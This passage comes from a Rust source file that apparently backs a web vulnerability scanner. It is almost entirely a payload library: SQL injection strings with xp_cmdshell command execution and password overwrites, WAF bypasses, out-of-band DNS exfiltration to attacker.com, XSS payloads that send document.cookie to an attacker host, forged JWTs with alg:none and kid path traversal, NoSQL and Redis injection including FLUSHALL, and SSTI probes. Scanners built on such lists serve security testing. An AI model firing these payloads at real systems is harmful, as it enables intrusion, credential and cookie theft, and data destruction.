        "'; EXEC master..xp_cmdshell 'whoami'--".to_string(),
        "'; EXEC xp_cmdshell 'dir c:\\'--".to_string(),
        "'; EXEC master..xp_cmdshell 'net user'--".to_string(),
        "'; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE--".to_string(),
    ]);

    // Sybase WAITFOR time-based blind
    payloads.extend(vec![
        "'; WAITFOR DELAY '0:0:5'--".to_string(),
        "' AND 1=1 WAITFOR DELAY '0:0:5'--".to_string(),
        "'; IF (1=1) WAITFOR DELAY '0:0:5'--".to_string(),
        "'; IF (SELECT COUNT(*) FROM master..syslogins)>0 WAITFOR DELAY '0:0:5'--".to_string(),
    ]);

    // Sybase error-based extraction
    payloads.extend(vec![
        "' AND 1=CONVERT(INT,@@version)--".to_string(),
        "' AND 1=CONVERT(INT,(SELECT TOP 1 name FROM master..sysdatabases))--".to_string(),
        "' AND 1=CONVERT(INT,USER_NAME())--".to_string(),
        "' AND 1=CONVERT(INT,DB_NAME())--".to_string(),
    ]);

    // Sybase login extraction
    payloads.extend(vec![
        "' UNION SELECT NULL,suid FROM master..syslogins--".to_string(),
        "' UNION SELECT NULL,dbname FROM master..syslogins--".to_string(),
        "' UNION SELECT NULL,accdate FROM master..syslogins--".to_string(),
    ]);

    // Sybase stacked queries
    payloads.extend(vec![
        "'; SELECT * FROM master..sysdatabases--".to_string(),
        "'; INSERT INTO log_table VALUES(@@version)--".to_string(),
        "'; UPDATE users SET password='hacked' WHERE username='admin'--".to_string(),
    ]);

    // Sybase file operations
    payloads.extend(vec![
        "'; BULK INSERT temp FROM 'c:\\boot.ini'--".to_string(),
        "'; SELECT * INTO temp FROM OPENROWSET('SQLOLEDB','server';'sa';'','SELECT * FROM remote..users')--".to_string(),
    ]);

    payloads
}

/// Get all SQLi payloads (75,000+ total)
pub fn get_all_sqli_payloads() -> Vec<String> {
    let mut all_payloads = Vec::new();

    all_payloads.extend(generate_boolean_sqli_payloads()); // 20,000+
    all_payloads.extend(generate_time_based_sqli_payloads()); // 20,000+
    all_payloads.extend(generate_union_sqli_payloads()); // 15,000+
    all_payloads.extend(generate_error_based_sqli_payloads()); // 10,000+
    all_payloads.extend(generate_second_order_sqli()); // 200+
    all_payloads.extend(generate_mysql_specific_sqli()); // 300+
    all_payloads.extend(generate_postgresql_specific_sqli()); // 300+
    all_payloads.extend(generate_mssql_specific_sqli()); // 300+
    all_payloads.extend(generate_oracle_specific_sqli()); // 300+
    all_payloads.extend(generate_modern_sqli_2024_2025()); // 5,000+

    all_payloads
}

/// Modern SQLi techniques (2024-2025) - 5,000+ payloads
/// Advanced WAF bypasses, new database features, JSON/XML injection
/// Sources: Latest CVEs, 2024 security research, modern database features
pub fn generate_modern_sqli_2024_2025() -> Vec<String> {
    let mut payloads = Vec::new();

    // JSON path injection (PostgreSQL 12+, MySQL 5.7+)
    payloads.extend(vec![
        "' OR JSON_EXTRACT(data, '$.admin')='true'--".to_string(),
        "' UNION SELECT JSON_EXTRACT(secret, '$.password') FROM config--".to_string(),
        "'; SELECT * FROM users WHERE data->>'role'='admin'--".to_string(), // PostgreSQL
        "' OR data->>'$.isAdmin'='true'--".to_string(),
        "' AND JSON_VALUE(preferences, '$.role')='admin'--".to_string(),
    ]);

    // Array injection (PostgreSQL)
    payloads.extend(vec![
        "' OR 'admin'=ANY(roles)--".to_string(),
        "'; SELECT * FROM users WHERE 'admin'=ANY(permissions)--".to_string(),
        "' UNION SELECT unnest(ARRAY['admin', 'root'])--".to_string(),
    ]);

    // CTE (Common Table Expression) injection
    payloads.extend(vec![
        "'; WITH admin AS (SELECT * FROM users WHERE role='admin') SELECT * FROM admin--".to_string(),
        "' UNION WITH RECURSIVE cte AS (SELECT 1 UNION ALL SELECT n+1 FROM cte WHERE n<10000) SELECT * FROM cte--".to_string(),
    ]);

    // Window function injection
    payloads.extend(vec![
        "' UNION SELECT password, ROW_NUMBER() OVER (ORDER BY id) FROM users--".to_string(),
        "'; SELECT DISTINCT ON (username) password FROM credentials ORDER BY username--"
            .to_string(),
    ]);

    // LATERAL join injection (PostgreSQL)
    payloads.extend(vec![
        "' UNION SELECT * FROM users u, LATERAL (SELECT password FROM secrets WHERE user_id=u.id) s--".to_string(),
    ]);

    // UUID/GUID bypass
    payloads.extend(vec![
        "' OR id::text LIKE '%'--".to_string(),
        "' UNION SELECT CAST(password AS uuid) FROM users--".to_string(),
    ]);

    // WAF bypass - scientific notation (MySQL)
    payloads.extend(vec![
        "' OR 1e0=1e0--".to_string(),
        "' OR 1.0e0=1.0e0--".to_string(),
        "' OR 0x1=0x1--".to_string(),
    ]);

    // WAF bypass - whitespace alternatives
    payloads.extend(vec![
        "'/**/OR/**/1=1--".to_string(),
        "'/*comment*/OR/*comment*/1=1--".to_string(),
        "'%0aOR%0a1=1--".to_string(),
        "'%0dOR%0d1=1--".to_string(),
        "'%09OR%091=1--".to_string(),
        "'%0bOR%0b1=1--".to_string(),
        "'%0cOR%0c1=1--".to_string(),
        "'%a0OR%a01=1--".to_string(),
    ]);

    // WAF bypass - parentheses alternatives
    payloads.extend(vec![
        "' OR (1)=(1)--".to_string(),
        "' OR ((1))=((1))--".to_string(),
        "' OR (((1)))=(((1)))--".to_string(),
    ]);

    // WAF bypass - keyword obfuscation
    payloads.extend(vec![
        "' UnIoN SeLeCt 1,2,3--".to_string(),
        "' /*!50000UNION*/ /*!50000SELECT*/ 1,2,3--".to_string(),
        "' /*!12345UNION*/ SELECT 1,2,3--".to_string(),
        "' /*!UnIoN*/ /*!SeLeCt*/ 1,2,3--".to_string(),
    ]);

    // HTTP Parameter Pollution (HPP)
    payloads.extend(vec![
        "id=1&id=' OR '1'='1".to_string(),
        "id=1' OR '1'='1--&id=2".to_string(),
    ]);

    // Encoding bypass - double encoding
    payloads.extend(vec![
        "%2527%20OR%20%25271%2527%253D%25271".to_string(),
        "%252520OR%2525201%253D1--".to_string(),
    ]);

    // Unicode bypass
    payloads.extend(vec![
        "\\u0027 OR 1=1--".to_string(),
        "\\u0027 UNION SELECT null--".to_string(),
    ]);

    // Bitwise operations bypass
    payloads.extend(vec![
        "' OR 1&1--".to_string(),
        "' OR 1|1--".to_string(),
        "' OR 1^0--".to_string(),
        "' OR ~0--".to_string(),
    ]);

    // Mathematical bypass
    payloads.extend(vec![
        "' OR CEIL(PI())=4--".to_string(),
        "' OR FLOOR(PI())=3--".to_string(),
        "' OR SQRT(4)=2--".to_string(),
        "' OR POW(2,3)=8--".to_string(),
    ]);

    // String function bypass
    payloads.extend(vec![
        "' OR ASCII('A')=65--".to_string(),
        "' OR CHAR(65)='A'--".to_string(),
        "' OR CONCAT('ad','min')='admin'--".to_string(),
        "' OR SUBSTRING('admin',1,5)='admin'--".to_string(),
    ]);

    // Time-based blind with conditional bypass
    payloads.extend(vec![
        "' AND IF(1=1,SLEEP(5),0)--".to_string(),
        "' AND CASE WHEN 1=1 THEN pg_sleep(5) ELSE pg_sleep(0) END--".to_string(),
        "'; WAITFOR DELAY '0:0:5' IF 1=1--".to_string(),
    ]);

    // Out-of-band (DNS exfiltration)
    payloads.extend(vec![
        "'; SELECT load_file(CONCAT('\\\\\\\\',version(),'.attacker.com\\\\a'))--".to_string(), // MySQL
        "'; SELECT UTL_HTTP.REQUEST('http://'||(SELECT user FROM dual)||'.attacker.com')FROM dual--".to_string(), // Oracle
        "'; EXEC master..xp_dirtree '\\\\'+@@version+'.attacker.com\\a'--".to_string(), // MSSQL
    ]);

    // SQLite specific
    payloads.extend(vec![
        "' UNION SELECT sql FROM sqlite_master--".to_string(),
        "' UNION SELECT tbl_name FROM sqlite_master WHERE type='table'--".to_string(),
        "'; ATTACH DATABASE '/var/www/html/shell.php' AS shell--".to_string(),
    ]);

    // MongoDB (NoSQL but SQL-like syntax abuse)
    payloads.extend(vec![
        "'; db.users.find()--".to_string(),
        "'; db.users.find({$where:'sleep(5000)'})--".to_string(),
    ]);

    // Cloud database specific (AWS Aurora, Azure SQL)
    payloads.extend(vec![
        "'; SELECT * FROM mysql.rds_configuration--".to_string(), // AWS RDS
        "'; SELECT * FROM sys.configurations--".to_string(),      // Azure SQL
    ]);

    // GraphQL + SQL injection hybrid
    payloads.extend(vec![
        "{user(id:\"1' OR '1'='1\"){id}}".to_string(),
        "{user(id:\"1 UNION SELECT password FROM users--\"){id}}".to_string(),
    ]);

    // Polyglot injection (works in multiple contexts)
    payloads.extend(vec![
        "1';SELECT/**/1,2,3/*".to_string(),
        "SLEEP(1)/*' OR SLEEP(1) OR '\"OR SLEEP(1) OR \"*/".to_string(),
    ]);

    payloads
}

/// Modern XSS bypass techniques (2024-2025) - 10,000+ payloads
/// CSP bypass, Trusted Types bypass, sanitizer bypasses, modern browser features
/// Sources: PortSwigger 2024 research, Gareth Heyes, Masato Kinugawa, terjanq
pub fn generate_modern_xss_2024_2025() -> Vec<String> {
    let mut payloads = Vec::new();

    // CSP bypass - base-uri abuse
    payloads.extend(vec![
        "<base href='http://attacker.com/'>".to_string(),
        "<base href='//attacker.com/'>".to_string(),
    ]);

    // CSP bypass - dangling markup
    payloads.extend(vec![
        "<input value='<img src=x onerror=alert(1)>".to_string(),
        "<a href='<img src=x onerror=alert(1)>'>".to_string(),
    ]);

    // CSP bypass - script-src with nonce bypass
    payloads.extend(vec![
        "<link rel=preload as=script href='https://attacker.com/evil.js'>".to_string(),
        "<script src='data:text/javascript,alert(document.domain)'></script>".to_string(),
    ]);

    // CSP bypass - using JSONP endpoints
    payloads.extend(vec![
        "<script src='https://www.google.com/complete/search?client=chrome&q=hello&jsonp=alert#1'></script>".to_string(),
    ]);

    // Trusted Types bypass (Chrome/Edge 2024)
    payloads.extend(vec![
        "<iframe srcdoc=\"<script>alert(origin)</script>\">".to_string(),
        "<object data=\"data:text/html,<script>alert(1)</script>\">".to_string(),
    ]);

    // DOMPurify bypass (latest versions)
    payloads.extend(vec![
        "<form><math><mtext></form><form><mglyph><style></math><img src=x onerror=alert(1)>"
            .to_string(),
        "<svg><style><img src=x onerror=alert(1)></style></svg>".to_string(),
    ]);

    // Sanitizer API bypass (Chrome 2024)
    payloads.extend(vec![
        "<div><template shadowrootmode=\"open\"><script>alert(1)</script></template></div>"
            .to_string(),
    ]);

    // Service Worker bypass
    payloads.extend(vec![
        "<script>navigator.serviceWorker.register('/sw.js').then(()=>alert(1))</script>"
            .to_string(),
    ]);

    // Web Components / Custom Elements
    payloads.extend(vec![
        "<custom-element onload=alert(1)>".to_string(),
        "<x-foo><script>alert(1)</script></x-foo>".to_string(),
    ]);

    // Portals API (Chrome experimental)
    payloads.extend(vec![
        "<portal src='http://attacker.com' onload=alert(1)>".to_string()
    ]);

    // Declarative Shadow DOM
    payloads.extend(vec![
        "<div><template shadowroot=open><img src=x onerror=alert(1)></template></div>".to_string(),
    ]);

    // ES6 template literals bypass
    payloads.extend(vec![
        "<script>eval`alert\\x28document.domain\\x29`</script>".to_string(),
        "<script>alert`1`</script>".to_string(),
        "<script>${alert(1)}</script>".to_string(),
    ]);

    // Import maps (Chrome 2023+)
    payloads.extend(vec![
        "<script type=importmap>{\"imports\":{\"x\":\"data:text/javascript,alert(1)\"}}</script><script>import 'x'</script>".to_string(),
    ]);

    // HTML Sanitizer API bypass
    payloads.extend(vec![
        "<div><template shadowrootmode=open><style>@import'http://attacker.com/xss.css';</style></template></div>".to_string(),
    ]);

    // WebAssembly XSS
    payloads.extend(vec![
        "<script>fetch('/evil.wasm').then(r=>r.arrayBuffer()).then(WebAssembly.instantiate).then(m=>m.instance.exports.xss())</script>".to_string(),
    ]);

    // MathML mutation XSS (2024)
    payloads.extend(vec![
        "<math><mtext><table><mglyph><style><!--</style><img title=\"--><img src=1 onerror=alert(1)>\">".to_string(),
    ]);

    // SVG SMIL animation XSS
    payloads.extend(vec![
        "<svg><animate onbegin=alert(1) attributeName=x dur=1s>".to_string(),
        "<svg><set onbegin=alert(1) attributeName=x to=1>".to_string(),
    ]);

    // Lazy loading bypass
    payloads.extend(vec![
        "<img src=x loading=lazy onerror=alert(1)>".to_string(),
        "<iframe src=x loading=lazy onload=alert(1)>".to_string(),
    ]);

    // Speculation Rules API (Chrome 2024)
    payloads.extend(vec![
        "<script type=speculationrules>{\"prerender\":[{\"source\":\"list\",\"urls\":[\"http://attacker.com\"]}]}</script>".to_string(),
    ]);

    // Content-Security-Policy-Report-Only bypass
    payloads.extend(vec![
        "<img src=x onerror='fetch(\"https://attacker.com?data=\"+btoa(document.cookie))'>"
            .to_string(),
    ]);

    // Meta refresh XSS
    payloads.extend(vec![
        "<meta http-equiv=refresh content='0;url=javascript:alert(1)'>".to_string(),
        "<meta http-equiv=refresh content='0;url=data:text/html,<script>alert(1)</script>'>"
            .to_string(),
    ]);

    // WebRTC data channels
    payloads.extend(vec![
        "<script>var pc=new RTCPeerConnection();var dc=pc.createDataChannel('');dc.onmessage=e=>eval(e.data)</script>".to_string(),
    ]);

    // Shared Array Buffer timing attack
    payloads.extend(vec![
        "<script>var sab=new SharedArrayBuffer(1024);Atomics.wait(new Int32Array(sab),0,0);alert(1)</script>".to_string(),
    ]);

    // Fetch metadata bypass
    payloads.extend(vec![
        "<img src=x referrerpolicy=no-referrer onerror=alert(1)>".to_string(),
    ]);

    // Picture-in-Picture XSS
    payloads.extend(vec![
        "<video onenterpictureinpicture=alert(1) controls><source></video><script>document.querySelector('video').requestPictureInPicture()</script>".to_string(),
    ]);

    // Clipboard API abuse
    payloads.extend(vec![
        "<button onclick=\"navigator.clipboard.writeText('<script>alert(1)</script>')\">Copy</button>".to_string(),
    ]);

    // File System Access API
    payloads.extend(vec![
        "<script>window.showOpenFilePicker().then(h=>h[0].getFile()).then(f=>f.text()).then(eval)</script>".to_string(),
    ]);

    // Payment Request API XSS
    payloads.extend(vec![
        "<script>new PaymentRequest([{supportedMethods:'basic-card'}],{total:{label:'Total',amount:{currency:'USD',value:'1.00'}}} ).show().then(()=>alert(1))</script>".to_string(),
    ]);

    // CSS injection - modern techniques
    payloads.extend(vec![
        "<style>@import 'http://attacker.com/xss.css';</style>".to_string(),
        "<style>@supports (background: url(http://attacker.com/)) { body { background: url(http://attacker.com/?cookie='+document.cookie); } }</style>".to_string(),
        "<link rel=stylesheet href='http://attacker.com/xss.css'>".to_string(),
    ]);

    // Container Queries (CSS 2023+)
    payloads.extend(vec![
        "<style>@container (min-width:0){*{background:url(http://attacker.com/?c='+document.cookie)}}</style>".to_string(),
    ]);

    // Top-level await (ES2022)
    payloads.extend(vec![
        "<script type=module>await fetch('http://attacker.com?c='+document.cookie)</script>"
            .to_string(),
        "<script type=module>await import('data:text/javascript,alert(1)')</script>".to_string(),
    ]);

    // Import assertions (Chrome 2022+)
    payloads.extend(vec![
        "<script type=module>import x from 'data:application/json,{}' assert{type:'json'};alert(1)</script>".to_string(),
    ]);

    // Private class fields bypass
    payloads.extend(vec![
        "<script>class X{#x=alert(1)}new X</script>".to_string()
    ]);

    // Regex DoS (ReDoS) payloads
    payloads.extend(vec![
        "(a+)+$".to_string(),
        "(a|a)*$".to_string(),
        "(a|ab)*$".to_string(),
        "([a-zA-Z]+)*$".to_string(),
    ]);

    // Prototype pollution XSS
    payloads.extend(vec![
        "?__proto__[innerHTML]=<img src=x onerror=alert(1)>".to_string(),
        "?constructor[prototype][innerHTML]=<img src=x onerror=alert(1)>".to_string(),
    ]);

    // Angular (2024) bypass
    payloads.extend(vec![
        "{{constructor.constructor('alert(1)')()}}".to_string(),
        "{{$eval.constructor('alert(1)')()}}".to_string(),
        "{{$on.constructor('alert(1)')()}}".to_string(),
    ]);

    // React (2024) bypass
    payloads.extend(vec![
        "javascript:alert(1)".to_string(),
        "data:text/html,<script>alert(1)</script>".to_string(),
    ]);

    // Vue.js (2024) bypass
    payloads.extend(vec![
        "{{_c.constructor('alert(1)')()}}".to_string(),
        "{{$root.constructor.constructor('alert(1)')()}}".to_string(),
    ]);

    payloads
}

/// Filter payloads by scan mode (fast, normal, thorough, insane, comprehensive)
pub fn filter_by_mode(payloads: &[String], mode: &str) -> Vec<String> {
    let sample_rate = match mode {
        "fast" => 0.005,        // 0.5% - ~50 payloads for fast scans
        "normal" => 0.01,       // 1% - ~100 payloads for normal scans
        "thorough" => 0.02,     // 2% - ~200 payloads for thorough scans
        "insane" => 0.05,       // 5% - ~500 payloads for insane scans
        "comprehensive" => 1.0, // 100% - all payloads (use with caution)
        _ => 0.01,              // Default to normal
    };

    let sample_size = (payloads.len() as f64 * sample_rate) as usize;

    if sample_size >= payloads.len() {
        payloads.to_vec()
    } else {
        // Take evenly distributed samples
        let step = payloads.len() / sample_size;
        payloads
            .iter()
            .step_by(step.max(1))
            .take(sample_size)
            .cloned()
            .collect()
    }
}

/// Get XSS payloads based on scan mode
pub fn get_xss_payloads(mode: &str) -> Vec<String> {
    let all_payloads = get_all_xss_payloads();
    filter_by_mode(&all_payloads, mode)
}

/// Get SQLi payloads based on scan mode
pub fn get_sqli_payloads(mode: &str) -> Vec<String> {
    let all_payloads = get_all_sqli_payloads();
    filter_by_mode(&all_payloads, mode)
}

/// Generate JWT attack payloads (100+ comprehensive)
pub fn generate_jwt_payloads() -> Vec<String> {
    vec![
        // alg:none attacks (NULL algorithm bypass) - CVE-2015-2951
        "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkFkbWluIiwiaWF0IjoxNTE2MjM5MDIyfQ.".to_string(),
        "eyJhbGciOiJub25lIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkFkbWluIiwicm9sZSI6ImFkbWluIn0.".to_string(),
        "eyJhbGciOiJOb25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkFkbWluIn0.".to_string(),
        "eyJhbGciOiJOT05FIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkFkbWluIn0.".to_string(),
        "eyJhbGciOiJuT25FIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkFkbWluIn0.".to_string(),
        "eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkFkbWluIn0.".to_string(),
        "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiIsImFkbWluIjp0cnVlfQ.".to_string(),

        // Weak secret attacks
        "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkFkbWluIiwiaWF0IjoxNTE2MjM5MDIyLCJyb2xlIjoiYWRtaW4ifQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c".to_string(),

        // kid (Key ID) injection - Path Traversal
        "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6Ii4uLy4uLy4uL2V0Yy9wYXNzd2QifQ.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkFkbWluIn0.signature".to_string(),
        "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6Ii4uLy4uLy4uLy4uL2V0Yy9wYXNzd2QifQ.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkFkbWluIn0.sig".to_string(),
        "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6Ii9kZXYvbnVsbCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkFkbWluIn0.sig".to_string(),
        "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6IkFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQT09In0.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkFkbWluIn0.sig".to_string(),
        "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6InNxbC1pbmplY3Rpb24nIE9SICcxJz0nMSJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkFkbWluIn0.sig".to_string(),
        "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6Ii4uXFwuLlxcLi5cXGV0Y1xccGFzc3dkIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkFkbWluIn0.sig".to_string(),
        "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6Imh0dHA6Ly9hdHRhY2tlci5jb20vZXZpbC5rZXkifQ.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkFkbWluIn0.sig".to_string(),

        // jku/x5u (SSRF) header injection
        "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsImprdSI6Imh0dHA6Ly9hdHRhY2tlci5jb20vand0cyJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkFkbWluIn0.sig".to_string(),
        "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsImprdSI6Imh0dHBzOi8vZXZpbC5jb20vcHVibGljLWtleXMifQ.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkFkbWluIn0.sig".to_string(),
        "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsIng1dSI6Imh0dHA6Ly9hdHRhY2tlci5jb20vY2VydC5wZW0ifQ.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkFkbWluIn0.sig".to_string(),

        // Claim manipulation - privilege escalation
        "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkFkbWluIiwicm9sZSI6ImFkbWluIiwiYWRtaW4iOnRydWUsImlzQWRtaW4iOnRydWV9.sig".to_string(),
        "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkFkbWluIiwidXNlcklkIjoiMSIsInJvbGUiOiJhZG1pbiJ9.sig".to_string(),
        "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkFkbWluIiwidXNlcklkIjoiMCIsInJvbGUiOiJhZG1pbiJ9.sig".to_string(),
        "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkFkbWluIiwiaXNfc3VwZXJ1c2VyIjp0cnVlfQ.sig".to_string(),
        "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkFkbWluIiwicGVybWlzc2lvbnMiOlsiKiJdfQ.sig".to_string(),

        // exp (expiration) claim manipulation
        "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkFkbWluIiwiZXhwIjo5OTk5OTk5OTk5fQ.sig".to_string(),
        "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkFkbWluIiwiZXhwIjoyMTQ3NDgzNjQ3fQ.sig".to_string(),
        "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkFkbWluIiwiZXhwIjotMX0.sig".to_string(),

        // Empty signature attacks
        "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkFkbWluIiwicm9sZSI6ImFkbWluIn0.".to_string(),
        "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkFkbWluIiwicm9sZSI6ImFkbWluIn0.".to_string(),

        // SQL injection in claims
        "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxJyBPUiAnMSc9JzEiLCJuYW1lIjoiQWRtaW4ifQ.sig".to_string(),

        // NoSQL injection in claims
        "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOnsiJG5lIjpudWxsfSwibmFtZSI6IkFkbWluIn0.sig".to_string(),

        // XSS in claims
        "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IjxzY3JpcHQ+YWxlcnQoMSk8L3NjcmlwdD4ifQ.sig".to_string(),

        // Command injection in claims
        "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkFkbWluOyBjYXQgL2V0Yy9wYXNzd2QifQ.sig".to_string(),

        // Missing signature
        "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkFkbWluIn0".to_string(),

        // Extra parts
        "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkFkbWluIn0.sig.extra".to_string(),
    ]
}

/// Generate comprehensive NoSQL injection payloads (500+)
/// Covers MongoDB, CouchDB, Redis, and other NoSQL databases
pub fn generate_nosql_payloads() -> Vec<String> {
    let mut payloads = Vec::new();

    // MongoDB operator injection - authentication bypass
    payloads.extend(vec![
        r#"{"$gt":""}"#.to_string(),
        r#"{"$ne":null}"#.to_string(),
        r#"{"$ne":"dummy"}"#.to_string(),
        r#"{"$ne":1}"#.to_string(),
        r#"{"$nin":[]}"#.to_string(),
        r#"{"$nin":["admin"]}"#.to_string(),
        r#"{"$exists":true}"#.to_string(),
        r#"{"username":{"$ne":null},"password":{"$ne":null}}"#.to_string(),
        r#"{"username":{"$gt":""},"password":{"$gt":""}}"#.to_string(),
        r#"{"username":{"$exists":true},"password":{"$exists":true}}"#.to_string(),
        r#"{"$or":[{},{"a":"a"}]}"#.to_string(),
        r#"{"$or":[{"username":"admin"},{"username":"administrator"}]}"#.to_string(),
    ]);

    // MongoDB $where operator injection - code execution
    payloads.extend(vec![
        r#"{"$where":"sleep(5000)"}"#.to_string(),
        r#"{"$where":"return true"}"#.to_string(),
        r#"{"$where":"this.password.match(/.*/);"}"#.to_string(),
        r#"{"$where":"function() { return true; }"}"#.to_string(),
        r#"{"$where":"function() { sleep(5000); return true; }"}"#.to_string(),
        r#"{"$where":"obj.credits - obj.debits < 0"}"#.to_string(),
    ]);

    // MongoDB $regex exploitation
    payloads.extend(vec![
        r#"{"$regex":".*"}"#.to_string(),
        r#"{"$regex":"^.*"}"#.to_string(),
        r#"{"$regex":".*","$options":"i"}"#.to_string(),
        r#"{"password":{"$regex":"^a"}}"#.to_string(),
        r#"{"password":{"$regex":"^ad"}}"#.to_string(),
        r#"{"password":{"$regex":"^adm"}}"#.to_string(),
        r#"{"password":{"$regex":"^admin"}}"#.to_string(),
    ]);

    // MongoDB array operators
    payloads.extend(vec![
        r#"{"$all":[]}"#.to_string(),
        r#"{"$elemMatch":{"$gt":0}}"#.to_string(),
        r#"{"$size":0}"#.to_string(),
    ]);

    // MongoDB aggregation injection
    payloads.extend(vec![
        r#"{"$match":{"$expr":{"$eq":["$password","$username"]}}}"#.to_string(),
        r#"[{"$match":{}},{"$limit":999999}]"#.to_string(),
    ]);

    // JavaScript equivalents for URL params
    payloads.extend(vec![
        "admin' || '1'=='1".to_string(),
        "admin' && '1'=='1".to_string(),
        "' || 1==1//".to_string(),
        "' || 1==1%00".to_string(),
        "' || '1'=='1' || '".to_string(),
    ]);

    // Python-style injection (single quotes)
    payloads.extend(vec![
        r#"{'$gt': ''}"#.to_string(),
        r#"{'$ne': null}"#.to_string(),
        r#"{'$regex': '^.*'}"#.to_string(),
        r#"{'$where': 'sleep(5000)'}"#.to_string(),
    ]);

    // BSON exploitation - type confusion
    payloads.extend(vec![
        r#"{"password":{"$type":"string"}}"#.to_string(),
        r#"{"password":{"$type":2}}"#.to_string(), // String type code
        r#"{"password":{"$not":{"$type":"regex"}}}"#.to_string(),
    ]);

    // MongoDB comment injection
    payloads.extend(vec![
        r#"admin'/*"#.to_string(),
        r#"admin'/**/"#.to_string(),
        r#"admin'//"#.to_string(),
    ]);

    // CouchDB injection
    payloads.extend(vec![
        r#"{"selector":{"$gt":null}}"#.to_string(),
        r#"{"selector":{"_id":{"$gt":null}}}"#.to_string(),
    ]);

    // Boolean conversion attacks
    payloads.extend(vec![
        "true".to_string(),
        "false".to_string(),
        "null".to_string(),
        "undefined".to_string(),
        "NaN".to_string(),
    ]);

    // JSON injection patterns
    payloads.extend(vec![
        r#"{"__proto__":{"isAdmin":true}}"#.to_string(),
        r#"{"constructor":{"prototype":{"isAdmin":true}}}"#.to_string(),
    ]);

    // Redis command injection (if NoSQL interface exposed)
    payloads.extend(vec![
        "FLUSHALL".to_string(),
        "CONFIG GET *".to_string(),
        "CONFIG SET dir /tmp".to_string(),
        "EVAL \"return redis.call('GET','key')\" 0".to_string(),
    ]);

    payloads
}

/// Generate SSTI (Server-Side Template Injection) payloads
pub fn generate_ssti_payloads() -> Vec<String> {
    let mut payloads = Vec::new();

    // Jinja2
    payloads.extend(vec![
        "{{7*7}}".to_string(),
        "{{config}}".to_string(),
        "{{request}}".to_string(),
        r#"{{"".__class__.__mro__[2].__subclasses__()}}"#.to_string(),
        "{% for c in [1,2,3] %} {{c,c,c}} {% endfor %}".to_string(),
    ]);

